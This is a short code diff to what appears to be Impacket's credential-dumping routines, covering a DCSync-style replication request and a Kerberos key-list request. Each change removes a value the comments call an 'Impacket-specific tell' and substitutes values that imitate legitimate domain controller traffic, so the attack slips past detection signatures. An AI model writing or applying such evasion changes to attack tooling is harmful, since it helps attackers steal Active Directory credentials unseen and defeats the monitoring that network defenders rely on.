@@ -644,7 +644,9 @@ class RemoteOperations:
 
         request['pmsgIn']['V8']['ulFlags'] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
         request['pmsgIn']['V8']['cMaxObjects'] = 1
-        request['pmsgIn']['V8']['cMaxBytes'] = 0
+        # 0 here is an Impacket-specific tell. A real DC peer asks for an
+        # object-sized buffer, so use 64 KiB.
+        request['pmsgIn']['V8']['cMaxBytes'] = 0x10000
         request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
         if self.__ppartialAttrSet is None:
             self.__prefixTable = []
@@ -3552,7 +3554,9 @@ class KeyListSecrets:
         tgsReq['padata'][0]['padata-value'] = encodedApReq
         tgsReq['padata'][1] = noValue
         tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ.value)
-        encodedKeyReq = encoder.encode([23], asn1Spec=SequenceOf(componentType=Integer()))
+        # Request all common etypes rather than just RC4. The narrow [23]
+        # list is an Impacket-specific marker for this attack.
+        encodedKeyReq = encoder.encode([18, 17, 23], asn1Spec=SequenceOf(componentType=Integer()))
         tgsReq['padata'][1]['padata-value'] = encodedKeyReq
 
         reqBody = seq_set(tgsReq, 'req-body')
